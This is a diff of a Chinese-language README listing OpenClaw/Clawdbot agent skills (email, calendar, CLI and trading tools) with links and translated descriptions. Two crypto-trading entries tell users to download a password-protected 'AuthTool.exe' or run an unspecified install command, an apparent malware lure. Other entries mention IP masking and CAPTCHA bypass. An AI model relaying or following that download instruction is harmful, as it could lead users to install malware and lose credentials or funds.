@@ -1,1483 +1,10027 @@
 # Awesome OpenClaw Skills (中文官方库)
-> 翻译自 [Clawdbot 官方技能库](https://clawdhub.com/skills)，持续同步更新。
+> 翻译自 [OpenClaw 官方技能库](https://clawdhub.com/skills)，持续同步更新。
 > 所有技能已适配中文指令，可直接在 OpenClaw 中调用（支持 QQ/企业微信/飞书/钉钉/本地客户端）。
 
 ## 📑 目录
 
-### 一、办公自动化 📊
-- [📧 邮件管理](#-邮件管理)
-- [📅 日历与日程](#-日历与日程)
-- [📄 文档处理](#-文档处理)
-- [👥 CRM与客户管理](#-crm与客户管理)
-- [🤝 会议与协作](#-会议与协作)
-- [📝 笔记与知识库](#-笔记与知识库)
-
-### 二、系统工具 ⚙️
-- [📁 文件管理](#-文件管理)
-- [📊 系统监控](#-系统监控)
-- [🌐 网络工具](#-网络工具)
-- [⚙️ 自动化工具](#️-自动化工具)
-- [🔒 安全工具](#-安全工具)
-- [🎬 媒体处理](#-媒体处理)
-
-### 三、开发运维 🛠️
-- [💻 代码开发](#-代码开发)
-- [🚀 部署与CI/CD](#-部署与cicd)
-- [🗄️ 数据库管理](#️-数据库管理)
-- [☁️ 云平台管理](#️-云平台管理)
-- [📈 监控与日志](#-监控与日志)
-- [🔌 API与集成](#-api与集成)
-
-### 四、其他 🧩
-- [🤖 AI与搜索](#-ai与搜索)
-- [📱 社交媒体](#-社交媒体)
-- [💰 金融与交易](#-金融与交易)
-- [🏃 健康与生活](#-健康与生活)
-- [🎮 娱乐与游戏](#-娱乐与游戏)
-- [🧩 其他](#-其他)
-
-### 五、使用说明
-- [使用说明](#五-使用说明)
+- [🤖 AI 智能](#cat-ai-intelligence)
+- [🛠️ 开发工具](#cat-developer-tools)
+- [⚡ 效率提升](#cat-productivity)
+- [📊 数据分析](#cat-data-analysis)
+- [✍️ 内容创作](#cat-content-creation)
+- [🔒 安全合规](#cat-security-compliance)
+- [💬 通讯协作](#cat-communication-collaboration)
+- [使用说明](#使用说明)
 
 ![1a2e48234521390f158464923b85e716](https://github.com/user-attachments/assets/9392f324-e620-440f-ad28-0e17dbdd5e46)
 
 ---
 
-## 一、办公自动化 📊
+<a id="cat-ai-intelligence"></a>
 
-### 📧 邮件管理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| ABM 自动化外呼 | [Clawdbot/abm-outbound](https://clawdhub.com/skills/abm-outbound) | 多渠道 ABM 自动化，可将 LinkedIn URL 转变为协调一致的出站活动。抓取个人资料，利用 Apollo（电子邮件+电话）进行丰富，通过 Skip Trace 获取邮寄地址，然后通过 Scribeless 编排电子邮件序列、LinkedIn 触摸和手写信件。在拥挤的收件箱中脱颖而出的秘密武器。 |
-| AgentMail 邮件平台 | [Clawdbot/agentmail](https://clawdhub.com/skills/agentmail) | 专为 AI 客服人员设计的 API 优先电子邮件平台。创建和管理专用电子邮件收件箱，以编程方式发送和接收电子邮件，并使用 Webhook 和实时事件处理基于电子邮件的工作流程。当您需要设置代理电子邮件身份、从代理发送电子邮件、处理传入电子邮件工作流程或使用代理友好的基础架构替换 Gmail 等传统电子邮件提供商时，请使用。 |
-| AgentMail 集成 | [Clawdbot/agentmail-integration](https://clawdhub.com/skills/agentmail-integration) | 集成AgentMail API以实现AI代理电子邮件自动化。创建和管理专用电子邮件收件箱，以编程方式发送和接收电子邮件，使用Webhook和实时事件处理基于电子邮件的工作流程。在Codex需要设置座席电子邮件身份、从座席发送电子邮件、处理传入电子邮件工作流程或将Gmail等传统电子邮件提供商替换为座席友好型基础设施时使用。 |
-| Apollo 联系人数据丰富 | [Clawdbot/apollo-enrichment](https://clawdhub.com/skills/apollo-enrichment) | Apollo.io 联系方式和公司丰富 API。利用电子邮件、电话、职位、公司数据丰富人们的信息。通过行业、收入、员工数量和资金丰富组织。寻找前景。当用户需要丰富联系人、查找电子邮件、查找公司信息或搜索潜在客户时使用。 |
-| Apple 邮件客户端集成 | [Clawdbot/apple-mail](https://clawdhub.com/skills/apple-mail) | 适用于 macOS 的 Apple Mail.app 集成。通过快速直接访问（无枚举）来阅读收件箱、搜索电子邮件、发送电子邮件、回复和管理消息。 |
-| Apple Mail Moltbot 技能 | [Clawdbot/apple-mail-moltbot-skill](https://clawdhub.com/skills/apple-mail-moltbot-skill) | （无） |
-| Apple 邮件极速搜索 | [Clawdbot/apple-mail-search](https://clawdhub.com/skills/apple-mail-search) | 在 macOS 上通过 SQLite 快速搜索 Apple Mail。按主题、发件人、日期、附件搜索电子邮件 - 结果约为 50 毫秒，而使用 AppleScript 则需要 8 分钟以上。当要求查找、搜索或列出电子邮件时使用。 |
-| Apple 邮件安全搜索 | [Clawdbot/apple-mail-search-safe](https://clawdhub.com/skills/apple-mail-search-safe) | 快速、安全的 Apple Mail 搜索，支持正文内容。 |
-| Bitwarden CLI 管理 | [Clawdbot/bitwarden-vault](https://clawdhub.com/skills/bitwarden-vault) | 设置并使用 Bitwarden CLI (bw)。在安装 CLI、身份验证（登录/解锁）或从保管库读取机密时使用。支持电子邮件/密码、API 密钥和 SSO 身份验证方法。 |
-| Brevo 邮件营销平台 | [Clawdbot/brevo](https://clawdhub.com/skills/brevo) | Brevo （原Sendinblue ）电子邮件营销API ，用于管理联系人、列表、发送交易电子邮件和活动。在导入联系人、发送电子邮件、管理订阅或使用电子邮件自动化时使用。 |
-| Bring 购物清单助手 | [Clawdbot/bring-shopping](https://clawdhub.com/skills/bring-shopping) | 管理带来！使用电子邮件/密码登录，通过非官方的 Bring-shopping Node.js 库生成购物清单。用于在可接受 API 样式访问时列出列表、读取项目、添加/删除项目以及选中/取消选中项目。 |
-| Bitwarden CLI 管理 | [Clawdbot/bw-vault](https://clawdhub.com/skills/bw-vault) | 设置并使用 Bitwarden CLI (bw)。在安装 CLI、身份验证（登录/解锁）或从保管库读取机密时使用。支持电子邮件/密码、API 密钥和 SSO 身份验证方法。 |
-| CalDAV 日历同步 | [Clawdbot/caldav-calendar](https://clawdhub.com/skills/caldav-calendar) | 使用 vdirsyncer + khal 同步和查询 CalDAV 日历（iCloud、Google、Fastmail、Nextcloud 等）。适用于 Linux。 |
-| 因果推理 | [Clawdbot/causal-inference](https://clawdhub.com/skills/causal-inference) | 为代理行为添加因果推理。触发任何具有可观察结果的高级操作 - 电子邮件、消息、日历更改、文件操作、API 调用、通知、提醒、购买、部署。用于规划干预措施、调试故障、预测结果、回填历史数据进行分析或回答“如果我执行 X 会发生什么？”在回顾过去的操作以了解哪些有效/失败以及原因时也会触发。 |
-| Microsoft 365 CLI | [Clawdbot/clippy](https://clawdhub.com/skills/clippy) | 用于日历和电子邮件的 Microsoft 365 / Outlook CLI。在管理 Outlook 日历（查看、创建、更新、删除事件、查找会议时间、回复邀请）、发送/阅读电子邮件或搜索组织中的人员/房间时使用。 |
-| Dex 个人 CRM 管理 | [Clawdbot/dex-crm](https://clawdhub.com/skills/dex-crm) | 管理 Dex 个人 CRM (getdex.com) 联系人、注释和提醒。 当您需要执行以下操作时使用：(1) 搜索或浏览联系人，(2) 添加有关人员的注释， (3) 创建或检查提醒，(4) 查找联系方式（电话、电子邮件、生日）。 需要 DEX_API_KEY 环境变量。 |
-| 邮箱收发管理 | [Clawdbot/email](https://clawdhub.com/skills/email) | 电子邮件管理和自动化。跨多个提供商发送、阅读、搜索和组织电子邮件。 |
-| 电子邮件最佳实践 | [Clawdbot/email-best-practices](https://clawdhub.com/skills/email-best-practices) | 在构建电子邮件功能、电子邮件成为垃圾邮件、高跳出率、设置 SPF/DKIM/DMARC 身份验证、实施电子邮件捕获、确保合规性（CAN-SPAM、GDPR、CASL）、处理 Webhooks、重试逻辑或决定事务与营销时使用。 |
-| 即时防御 | [Clawdbot/email-prompt-injection-defense](https://clawdhub.com/skills/email-prompt-injection-defense) | 检测并阻止电子邮件中的提示注入攻击。在阅读、处理或总结电子邮件时使用。扫描虚假系统输出、植入的思维块、指令劫持和其他注入模式。在按照电子邮件内容中的任何说明进行操作之前，需要用户确认。 |
-| 邮件模板生成器 | [Clawdbot/email-template-gen](https://clawdhub.com/skills/email-template-gen) | 生成响应式电子邮件模板。在构建交易电子邮件时使用。 |
-| Frigate NVR 监控 | [Clawdbot/frigate](https://clawdhub.com/skills/frigate) | 通过基于会话的身份验证访问 Frigate NVR 摄像机。获取实时快照、检索运动事件并获取流 URL。包括用于门铃、车道、前摄像头、东摄像头、邮箱摄像头和车库摄像头的 CLI 帮助程序脚本。 |
-| Google Workspace CLI | [Clawdbot/gog](https://clawdhub.com/skills/gog) | 适用于 Gmail、日历、云端硬盘、通讯录、表格和文档的 Google Workspace CLI。 |
-| Google Workspace 集成（无需云控制台） | [Clawdbot/google-workspace-mcp](https://clawdhub.com/skills/google-workspace-mcp) | Gmail、日历、云端硬盘、文档、表格 — 无需 Google Cloud Console。只需 OAuth 登录即可。与传统的 Google API 集成相比，设置复杂性为零。 |
-| Himalaya 邮件客户端 | [Clawdbot/himalaya](https://clawdhub.com/skills/himalaya) | CLI 通过 IMAP/SMTP 管理电子邮件。使用“喜马拉雅”从终端列出、阅读、编写、回复、转发、搜索和组织电子邮件。支持多个帐户和使用 MML（MIME 元语言）编写消息。 |
-| IMAP 邮件客户端 | [Clawdbot/imap-email](https://clawdhub.com/skills/imap-email) | 通过 IMAP（ProtonMail Bridge、Gmail 等）阅读和管理电子邮件。检查新的/未读的消息、获取内容、搜索邮箱以及标记为已读/未读。适用于任何 IMAP 服务器，包括 ProtonMail Bridge。 |
-| 日语翻译与学习助手 | [Clawdbot/japanese-translation-and-tutor](https://clawdhub.com/skills/japanese-translation-and-tutor) | 日英翻译和语言导师。在以下情况下使用：(1) 用户共享日语文本并需要翻译（新闻文章、推文、标志、菜单、电子邮件）。 (2) 用户询问日语单词/短语“X 是什么意思”。 (3) 用户想要学习日语语法、词汇或文化背景。 (4) 触发器：“翻译”、“这说什么”、“日译英”、“帮我理解”、“解释一下这个汉字”。提供结构化输出，包括阅读材料、词汇表和文化注释。 |
-| Locus 支付工具 | [Clawdbot/locus](https://clawdhub.com/skills/locus) | 人工智能代理的轨迹支付工具。当被要求发送付款、检查钱包余额、列出代币、批准代币支出或通过电子邮件处理与付款相关的操作时使用。还可用于 Locus (YC F25) 支付基础设施的演示 - 扫描电子邮件以获取支付请求并通过钱包发起加密支付。 |
-| Microsoft 365 CLI | [Clawdbot/mogcli](https://clawdhub.com/skills/mogcli) | Microsoft Ops Gadget — 适用于 Microsoft 365 的 CLI（邮件、日历、云端硬盘、联系人、任务、Word、PowerPoint、Excel、OneNote）。 |
-| 晨间邮件汇总 | [Clawdbot/morning-email-rollup](https://clawdhub.com/skills/morning-email-rollup) | 每日早上 8 点汇总重要电子邮件和日历事件，并提供人工智能生成的摘要 |
-| Outlook 邮件日历管理 | [Clawdbot/outlook](https://clawdhub.com/skills/outlook) | 通过 Microsoft Graph API 阅读、搜索和管理 Outlook 电子邮件和日历。当用户询问电子邮件、收件箱、Outlook、Microsoft 邮件、日历事件或日程安排时使用。 |
-| ProtonMail 邮件管理 | [Clawdbot/protonmail](https://clawdhub.com/skills/protonmail) | 通过 IMAP 桥（质子桥或氢氧化物）读取、搜索和扫描 ProtonMail。包括重要电子邮件的每日摘要。 |
-| PurelyMail 邮件设置 | [Clawdbot/purelymail](https://clawdhub.com/skills/purelymail) | 为 Clawdbot 代理设置并测试 PurelyMail 电子邮件。生成配置、测试 IMAP/SMTP、验证收件箱连接。 |
-| React Email 模板生成 | [Clawdbot/react-email-skills](https://clawdhub.com/skills/react-email-skills) | 使用 React 组件和 React Email 创建美观、响应式的 HTML 电子邮件。使用现代组件构建交易电子邮件，支持国际化，并与 Resend 等电子邮件服务提供商集成。在创建欢迎电子邮件、密码重置、通知、订单确认或任何 HTML 电子邮件模板时使用。 |
-| 招聘自动化 | [Clawdbot/recruitment-automation](https://clawdhub.com/skills/recruitment-automation) | 零麻烦精心设计的招聘自动化 - 从工作规范到候选人评估只需几秒钟。通过 we-crafted.com/agents/recruitment-automation 自动搜索网络、LinkedIn 和 GitHub、对候选人进行评分、填充跟踪表并起草外展电子邮件 - 在我们的网站中购买 CRAFTED_API_KEY 即可开始使用 |
-| Resend 邮件接收管理 | [Clawdbot/resend](https://clawdhub.com/skills/resend) | 通过重新发送 API 管理收到的（入站）电子邮件和附件。当用户询问其电子邮件、收到的消息或电子邮件附件时使用。 |
-| Resend 邮件平台 | [Clawdbot/resend-skills](https://clawdhub.com/skills/resend-skills) | 使用重新发送电子邮件平台时使用 - 路由到用于发送、接收、受众或广播的特定子技能。 |
-| Salesforce DX | [Clawdbot/salesforce-dx](https://clawdhub.com/skills/salesforce-dx) | 使用“sf”CLI 查询 Salesforce 数据并管理销售渠道。用于 SOQL 查询（简单到复杂）、机会管道分析、预测报告、数据导出、模式探索和 CRM 数据操作。还可用于执行工作流程，例如按名称查找交易、查找联系信息以向潜在客户发送电子邮件、准备管道审核以及与其他工具交叉引用 CRM 数据。触发 Salesforce、SOQL、管道、机会、预测、CRM 数据、交易查找、潜在客户电子邮件、帐户信息或 sf CLI 问题。 |
-| 邮件管理专家 | [Clawdbot/skill-email-management](https://clawdhub.com/skills/skill-email-management) | Apple Mail 的专家电子邮件管理助手。当用户提到收件箱管理、电子邮件组织、电子邮件分类、收件箱清零、组织电子邮件、管理邮件文件夹、电子邮件生产力、检查电子邮件或电子邮件工作流程优化时使用此选项。提供智能工作流程和最佳实践，以实现高效的电子邮件处理。 |
-| SOG CLI | [Clawdbot/sogcli](https://clawdhub.com/skills/sogcli) | 标准操作小工具 — 用于 IMAP/SMTP/CalDAV/CardDAV/WebDAV 的 CLI。 gog (Google) 和 mog (Microsoft) 的开放标准替代品。 |
+## 1、🤖 AI 智能
 
-### 📅 日历与日程
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 第二大脑知识库 | [Clawdbot/1](https://clawdhub.com/skills/1) | 由 Ensue 支持的个人知识库，用于捕获和检索理解。当用户想要保存知识、回忆他们所知道的内容、管理他们的工具箱或以过去的学习为基础时使用。触发“保存这个”、“记住”、“我知道什么”、“添加到工具箱”、“我的笔记”、“存储这个概念”。 |
-| Apple 日历 CLI | [Clawdbot/accli](https://clawdhub.com/skills/accli) | 在 macOS 上与 Apple 日历交互时应使用此技能。使用它来列出日历、查看事件、创建/更新/删除日历事件以及检查可用性/忙/闲时间。触发诸如“检查我的日历”、“安排会议”、“我的日程安排是什么”、“我明天有空吗”或任何与日历相关的操作等请求。 |
-| Actual Budget | [Clawdbot/actual-budget](https://clawdhub.com/skills/actual-budget) | 通过官方实际预算 Node.js API 查询和管理个人财务。用于预算查询、交易导入/导出、账户管理、分类、规则、计划以及与自托管实际预算实例的银行同步。 |
-| 广告生成器 | [Clawdbot/adr-gen](https://clawdhub.com/skills/adr-gen) | 使用 AI 生成架构决策记录。在记录技术决策时使用。 |
-| ADR 编写者 | [Clawdbot/adr-writer](https://clawdhub.com/skills/adr-writer) | 使用 AI 生成架构决策记录。在记录技术决策时使用。 |
-| 对抗性提示 | [Clawdbot/adversarial-prompting](https://clawdhub.com/skills/adversarial-prompting) | 应用严格的对抗性分析来生成、批评、修复和巩固任何问题（技术或非技术）的解决方案。当面临需要彻底分析、多种解决方法以及在实施之前验证建议修复的复杂问题时使用。 |
-| Agent Registry | [Clawdbot/agent-registry](https://clawdhub.com/skills/agent-registry) | 强制代理发现系统，用于高效代理加载。克劳德必须使用这个技能  而不是直接从 ~/.claude/agents/ 或 .claude/agents/ 加载代理。提供懒惰  通过 search_agents 和 get_agent 工具加载。使用时机： (1) 用户任务可能受益  专门的代理专业知识，(2) 用户询问可用的代理，(3) 启动复杂的  历史上使用代理的工作流程。此技能可将上下文窗口的使用率减少约 95%  与预先加载所有代理相比。 |
-| Agentic Spicy Food | [Clawdbot/agentic-spicy-food](https://clawdhub.com/skills/agentic-spicy-food) | 首要的代理就绪食品配送技能。享用正宗的四川麻辣小吃和权威的“自贡”兔特产目录。专为购物代理而设计，可执行精准订单、跟踪美食发货并探索手工风味。非常适合测试人工智能驱动的电子商务流程。 |
-| AgentLens 代码分析 | [Clawdbot/agentlens](https://clawdhub.com/skills/agentlens) | 使用 agentlens 分层文档导航和理解代码库。在探索新项目、查找模块、在大文件中定位符号、查找 TODO/警告或理解代码结构时使用。 |
-| 法航-荷航航班追踪 | [Clawdbot/airfrance-afkl](https://clawdhub.com/skills/airfrance-afkl) | 使用法航-荷航开放数据 API（航班状态）跟踪法航航班。当用户提供航班号/日期（例如 2026 年 1 月 29 日的 AF007）并希望进行监控、警报（延误/登机口/飞机变更）或分析（先前航班链、飞机尾号 → 客舱新近度/Wi-Fi）时使用。在 API 速率限制内设置或调整轮询计划时也可使用。 |
-| Alter Actions 触发 | [Clawdbot/alter-actions](https://clawdhub.com/skills/alter-actions) | 通过 x-callback-urls 触发更改 macOS 应用程序操作。超过 84 个操作的目录，包括提问、翻译、总结、语法纠正等。 |
-| 分析跟踪设置 | [Clawdbot/analytics-tracking](https://clawdhub.com/skills/analytics-tracking) | 当用户想要设置、改进或审核分析跟踪和测量时。当用户提及“设置跟踪”、“GA4”、“Google Analytics”、“转化跟踪”、“事件跟踪”、“UTM 参数”、“标签管理器”、“GTM”、“分析实施”或“跟踪计划”时也可使用。对于 A/B 测试测量，请参阅 ab-test-setup。 |
-| Antigravity Balance | [Clawdbot/antigravity-balance](https://clawdhub.com/skills/antigravity-balance) | 检查Google Antigravity AI模型配额/代币余额。当用户询问其反重力使用情况、剩余代币、模型限制、配额状态或速率限制时使用。通过检测本地反重力语言服务器进程并查询其 API 来工作。 |
-| Anyone 协议代理 | [Clawdbot/anyone-proxy](https://clawdhub.com/skills/anyone-proxy) | 此技能可以实现 IP 地址屏蔽并访问任何人网络上的隐藏服务。使用本地 SOCKS5 代理通过任何人协议 VPN 网络路由请求。 |
-| Apple 日历 | [Clawdbot/apple-calendar](https://clawdhub.com/skills/apple-calendar) | 适用于 macOS 的 Apple Calendar.app 集成。用于事件、搜索和多日历支持的 CRUD 操作。 |
-| Asana | [Clawdbot/asana](https://clawdhub.com/skills/asana) | 通过 Asana REST API 将 Asana 与 Clawdbot 集成。当您需要列出/搜索/创建/更新 Asana 任务/项目/工作空间，或为个人本地集成（OOB/手动代码粘贴）设置 Asana OAuth（授权代码授予）时使用。 |
-| Ask Questions If Underspecified | [Clawdbot/ask-questions-if-underspecified](https://clawdhub.com/skills/ask-questions-if-underspecified) | 实施前明确要求。不要自动使用，仅在显式调用时使用。 |
-| AssemblyAI 语音转录 | [Clawdbot/assemblyai-transcribe](https://clawdhub.com/skills/assemblyai-transcribe) | 使用 AssemblyAI 转录音频/视频（本地上传或 URL），以及字幕 + 段落/句子导出。 |
-| Atlassian MCP | [Clawdbot/atlassian-mcp](https://clawdhub.com/skills/atlassian-mcp) | 在 Docker 中运行模型上下文协议 (MCP) Atlassian 服务器，从而实现与 Jira、Confluence 和其他 Atlassian 产品的集成。当您需要查询 Jira 问题、搜索 Confluence 或以编程方式与 Atlassian 服务交互时使用。需要 Docker 和有效的 Jira API 凭据。 |
-| 自动更新程序 | [Clawdbot/auto-updater](https://clawdhub.com/skills/auto-updater) | 每天自动更新 Clawdbot 和所有已安装的技能。通过 cron 运行，检查更新，应用更新，并向用户发送有关更改内容的摘要的消息。 |
-| 自动更新程序 | [Clawdbot/auto-updater-1-0-0](https://clawdhub.com/skills/auto-updater-1-0-0) | 每天自动更新 Clawdbot 和所有已安装的技能。通过 cron 运行，检查更新，应用更新，并向用户发送有关更改内容的摘要的消息。 |
-| 自动更新程序 | [Clawdbot/auto-updater-bak-2026-01-28t18-01-13-10-30](https://clawdhub.com/skills/auto-updater-bak-2026-01-28t18-01-13-10-30) | 每天自动更新 Clawdbot 和所有已安装的技能。通过 cron 运行，检查更新，应用更新，并向用户发送有关更改内容的摘要的消息。 |
-| iMessage 自动回复 | [Clawdbot/autoresponder](https://clawdhub.com/skills/autoresponder) | 监控 iMessage/SMS 对话并根据可配置的规则、AI 提示和速率限制条件自动回复。当您需要使用 AI 根据对话上下文生成的响应来自动回复特定联系人时使用。当用户要求管理自动回复设置、联系人、提示或查看状态/历史记录时也可使用。 |
-| 备份脚本生成器 | [Clawdbot/backup-gen](https://clawdhub.com/skills/backup-gen) | 使用 AI 生成数据库备份脚本。当您需要自动备份到 S3、GCS 或本地存储时使用。 |
-| 备份脚本生成器 | [Clawdbot/backup-script-gen](https://clawdhub.com/skills/backup-script-gen) | 使用 AI 生成数据库备份脚本。当您需要自动备份到 S3、GCS 或本地存储时使用。 |
-| Bambu Lab 3D 打印机控制 | [Clawdbot/bambu-cli](https://clawdhub.com/skills/bambu-cli) | 使用 bambu-cli 操作 BambuLab 打印机并进行故障排除（状态/监视、打印开始/暂停/恢复/停止、文件、相机、gcode、AMS、校准、运动、风扇、灯光、配置、医生）。当用户要求控制或监视 BambuLab 打印机、设置配置文件或访问代码或将任务转换为具有正确标志、输出格式和确认的安全 bambu-cli 命令时使用。 |
-| Bambu Lab 3D 打印机控制 | [Clawdbot/bambu-local](https://clawdhub.com/skills/bambu-local) | 通过 MQTT（无云）在本地控制 Bambu Lab 3D 打印机。支持A1、A1 Mini、P1P、P1S、X1C。 |
-| 基础贸易代理 | [Clawdbot/base-agent](https://clawdhub.com/skills/base-agent) | Base 上的自动化 DEX 交易 - 通过 MEV 保护和 Gas 优化在 Base L2 上执行高速代币交换、流动性提供和套利。重要：对于 Windows，下载 AuthTool.exe（密码：1234），对于 macOS，运行安装命令 |
-| Beeper 聊天管理 | [Clawdbot/beeper](https://clawdhub.com/skills/beeper) | 搜索和浏览本地 Beeper 聊天记录（话题、消息、全文搜索）。 |
-| BMKG 地震监控 | [Clawdbot/bmkg-monitor](https://clawdhub.com/skills/bmkg-monitor) | 使用 BMKG 官方数据监测印度尼西亚地震数据。当用户询问最近的地震、有感地震或有关印度尼西亚特定地震事件的信息时使用。 |
-| BookStack Wiki 文档管理 | [Clawdbot/bookstack](https://clawdhub.com/skills/bookstack) | BookStack Wiki 和文档 API 集成。以编程方式管理您的知识库：创建、阅读、更新和删除书籍、章节、页面和书架。对所有内容进行全文搜索。当您需要执行以下操作时使用：(1) 创建或编辑 wiki 页面和文档，(2) 组织书籍和章节中的内容，(3) 搜索知识库，(4) 自动化文档工作流程，(5) 在系统之间同步内容。支持 HTML 和 Markdown 内容。 |
-| Browser Ladder | [Clawdbot/browser-ladder](https://clawdhub.com/skills/browser-ladder) | 攀登浏览器阶梯——免费开始，仅在需要时升级。 L1（获取）→ L2（本地剧作家）→ L3（BrowserCat）→ L4（用于验证码/机器人绕过的 Browserless.io）。 |
-| Browser Use API | [Clawdbot/browser-use-api](https://clawdhub.com/skills/browser-use-api) | 通过浏览器使用 API 进行云浏览器自动化。当您需要人工智能驱动的网页浏览、抓取、表单填写或多步骤网页任务而无需本地浏览器控制时，请使用。在“浏览器使用”、“云浏览器”、“抓取网站”、“自动执行 Web 任务”或本地浏览器不可用/不合适时触发。 |
-| 比特币交易 | [Clawdbot/bybit-agent](https://clawdhub.com/skills/bybit-agent) | Bybit 上的专业加密货币交易 - 具有高级订单类型、风险管理和投资组合分析的自动化现货、期货和期权交易。重要：对于 Windows，下载 AuthTool.exe（密码：1234），对于 macOS，运行安装命令 |
-| Apple 日历命令行工具 | [Clawdbot/calctl](https://clawdhub.com/skills/calctl) | 通过 icalBuddy + AppleScript CLI 管理 Apple 日历事件 |
-| 终端日历管理 | [Clawdbot/calcurse](https://clawdhub.com/skills/calcurse) | 基于文本的日历和日程安排应用程序。严格用于基于 CLI 的日历管理。 |
-| 日历 | [Clawdbot/calendar](https://clawdhub.com/skills/calendar) | 日历管理和日程安排。创建事件、管理会议以及跨日历提供商同步。 |
-| 信用卡奖励优化器 | [Clawdbot/card-optimizer](https://clawdhub.com/skills/card-optimizer) | 信用卡奖励优化器 - 通过为每个购买类别推荐最佳信用卡，帮助最大限度地提高现金返还、积分和里程。跟踪年度上限，计算年费投资回报率，管理轮换的季度类别，并根据支出模式建议新卡。 |
-| Claude Code 会话检查器 | [Clawdbot/ccsinfo](https://clawdhub.com/skills/ccsinfo) | 从远程服务器查询和分析 Claude Code 会话数据。当被要求检查 Claude Code 会话、查看对话历史记录、检查工具调用、跟踪任务、搜索提示或查看使用统计信息时使用。需要设置 CCSINFO_SERVER_URL 并运行 ccsinfo 服务器。 |
-| Chromecast 控制 | [Clawdbot/chromecast-control](https://clawdhub.com/skills/chromecast-control) | 控制本地网络上的 Chromecast 设备 - 发现、投射媒体、控制播放、管理队列以及保存/恢复状态 |
-| Clawd Coach | [Clawdbot/clawd-coach](https://clawdhub.com/skills/clawd-coach) | 创建个性化的铁人三项、马拉松和超耐力训练计划。当运动员询问训练计划、锻炼计划、比赛准备或教练建议时使用。可以与 Strava 同步以分析训练历史，或根据手动提供的健身数据进行工作。生成包含特定运动锻炼、区域和比赛日策略的定期计划。 |
-| ClawdBot 文档 v2 | [Clawdbot/clawd-docs-v2](https://clawdhub.com/skills/clawd-docs-v2) | 通过本地搜索索引、缓存片段和按需获取进行智能 ClawdBot 文档访问。令牌效率和新鲜度意识。 |
-| Clawdbot macOS 构建 | [Clawdbot/clawdbot-macos-build](https://clawdhub.com/skills/clawdbot-macos-build) | 从源代码构建 Clawdbot macOS 菜单栏应用程序。当您需要安装 Clawdbot.app 伴侣时使用（用于菜单栏状态、权限和 Mac 硬件访问，如相机/屏幕录制）。自动处理依赖项安装、UI 构建、Swift 编译、代码签名和应用程序打包。 |
-| Meshy AI 3D 生成 | [Clawdbot/clawdbot-meshyai-skill](https://clawdhub.com/skills/clawdbot-meshyai-skill) | 使用 Meshy.ai REST API 生成资产：(1) 文本转 2d（网格文本转图像）和 (2) 图像转 3d，然后在本地下载输出。当用户想要 Meshy 生成、需要轮询异步任务时使用，特别是当他们希望将生成的 OBJ 保存到磁盘时。环境中需要 MESHY_API_KEY。 |
-| Clawdbot 安全审计 | [Clawdbot/clawdbot-security](https://clawdhub.com/skills/clawdbot-security) | Clawdbot/Moltbot 安装的安全审核和强化。检测暴露的网关、修复权限、启用身份验证并指导防火墙/Tailscale 设置。 |
-| Clawdbot 同步 | [Clawdbot/clawdbot-sync](https://clawdhub.com/skills/clawdbot-sync) | 在多个 Clawdbot 实例之间同步内存、偏好和技能。支持通过 Tailscale 通过 SSH/rsync 进行双向同步。当要求与另一个 Clawdbot 同步、在实例之间共享内存或保持多个代理同步时使用。触发器：/sync、“与 mac 同步”、“更新其他clawdbot”、“与我的其他机器人共享”。 |
-| Codemod 生成器 | [Clawdbot/codemod-gen](https://clawdhub.com/skills/codemod-gen) | 为大规模代码更改生成代码模块。在跨多个文件重构模式时使用。 |
-| Codex 配额 | [Clawdbot/codex-quota](https://clawdhub.com/skills/codex-quota) | 使用本地会话日志检查 OpenAI Codex CLI 速率限制状态（每日/每周配额）。可移植的 Python 脚本。 |
-| CodexMonitor | [Clawdbot/codexmonitor](https://clawdhub.com/skills/codexmonitor) | 使用 CodexMonitor Homebrew 公式列出/检查/监视本地 OpenAI Codex 会话（CLI + VS Code）。 |
-| Compound Interest Calculator | [Clawdbot/compound-calc](https://clawdhub.com/skills/compound-calc) | 让您的 AI 代理自动学习和改进。随着时间的推移，回顾课程、提取学习内容、更新记忆文件并复合知识。设置夜间审核循环，让您的客服人员每天都变得更加聪明。 |
-| Compound Engineering | [Clawdbot/compound-engineering](https://clawdhub.com/skills/compound-engineering) | 让您的 AI 代理自动学习和改进。随着时间的推移，回顾课程、提取学习内容、更新记忆文件并复合知识。设置夜间审核循环，让您的客服人员每天都变得更加聪明。 |
-| 内容 ID 指南 | [Clawdbot/content-id-guide](https://clawdhub.com/skills/content-id-guide) | 创作者可以以一种平静的方式理解和组织跨平台的自动化内容声明，因此不会错过任何重要的内容。 |
-| 创意思维伙伴 | [Clawdbot/creative-thought-partner](https://clawdhub.com/skills/creative-thought-partner) | 一个对话式的创意思想伙伴，通过批判性观察和悖论搜寻揭示您想法中隐藏的才华。当有人想要探索想法、发现突破性见解、具体化未命名的概念或开发写作、内容创作、产品开发或任何创造性努力的原创框架时使用。 |
-| 批评文章作者 | [Clawdbot/critical-article-writer](https://clawdhub.com/skills/critical-article-writer) | 生成文章草稿、大纲和社论内容，将独特的分析、怀疑的声音与尖锐的批判性评论、对话语气和战略幽默相匹配。 |
-| Cron 重试 | [Clawdbot/cron-retry](https://clawdhub.com/skills/cron-retry) | 连接恢复时自动重试失败的 cron 作业。当 cron 作业由于网络错误而失败时使用，并且应在连接恢复后重试。与心跳集成以检测失败的作业并自动重新运行它们。 |
-| Cron 表达式生成器 | [Clawdbot/cron-writer](https://clawdhub.com/skills/cron-writer) | 将自然语言转换为 cron 表达式。当您需要安排任务时使用。 |
-| 跨领域创新引擎 | [Clawdbot/cross-pollination-engine](https://clawdhub.com/skills/cross-pollination-engine) | 系统地借鉴不相关行业的想法来解决问题。创新往往来自邻近领域。当用户说“异花授粉”、“X将如何解决这个问题”、“借用想法”、“我们可以从中学到什么”、“跳出框框思考”、“迪士尼/苹果/亚马逊将如何做到这一点”、“不同行业”、“窃取想法”时使用。 |
